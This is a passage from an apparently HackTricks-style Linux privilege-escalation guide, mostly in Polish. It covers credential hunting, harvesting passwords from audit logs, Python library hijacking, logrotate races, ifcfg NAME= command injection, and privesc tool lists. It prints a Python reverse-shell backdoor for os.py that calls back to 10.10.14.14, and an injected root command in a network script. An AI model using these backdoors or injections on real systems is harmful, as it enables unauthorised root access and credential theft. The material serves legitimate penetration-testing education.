**Innym ciekawym narzędziem**, którego możesz użyć do tego jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) które jest aplikacją open source używaną do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć **interesujące/poufne informacje w nich**. Im dziwniejszy log, tym bardziej prawdopodobne, że będzie interesujący.\
Również niektóre "**źle**" skonfigurowane (backdoored?) **audit logs** mogą pozwolić na **zapisywanie haseł** wewnątrz audit logs, jak wyjaśniono w tym poście: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby móc **czytać logi**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Ogólne wyszukiwanie Creds/Regex

Powinieneś również sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **treści**, a także sprawdzić adresy IP i e‑maile w logach, oraz regexy dla hashy.\
Nie będę tu wypisywał, jak to wszystko zrobić, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie kontrole, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, z **jakiego miejsca** skrypt python będzie uruchamiany i **możesz zapisywać w tym folderze** lub możesz **modyfikować biblioteki python**, możesz zmodyfikować bibliotekę os i dodać do niej backdoor (jeśli możesz zapisywać tam, gdzie skrypt python będzie uruchamiany, skopiuj i wklej bibliotekę os.py).

Aby **dodać backdoor do biblioteki** po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Luka w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** w pliku dziennika lub jego katalogach nadrzędnych potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często działający jako **root**, może zostać zmanipulowany do wykonywania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest, aby sprawdzać uprawnienia nie tylko w _/var/log_, ale także w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy `logrotate` w wersji `3.18.0` i starszych

Szczegółowe informacje o luce można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc za każdym razem, gdy znajdziesz możliwość modyfikacji logów, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, zastępując logi dowiązaniami symbolicznymi.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Skrypty sieciowe, np. _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak na Linuksie są one ~sourced~ przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest poprawnie obsługiwany. Jeśli w nazwie znajduje się **spacja (white/blank space), system próbuje wykonać część po tej spacji**. Oznacza to, że **wszystko po pierwszej spacji jest wykonywane jako root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Uwaga: spacja między Network a /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalog `/etc/init.d` jest miejscem dla **skryptów** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuxie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasem `reload` usług. Można je uruchamiać bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zadań związanych z zarządzaniem usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart ze względu na warstwę kompatybilności w Upstart.

**systemd** to nowoczesny menedżer inicjalizacji i usług, oferujący zaawansowane funkcje takie jak uruchamianie demonów na żądanie, zarządzanie automountami i migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz w `/etc/systemd/system/` dla modyfikacji administratora, upraszczając proces administracji systemu.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów privilege escalation w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeruje luki jądra w Linux i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbiór dodatkowych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
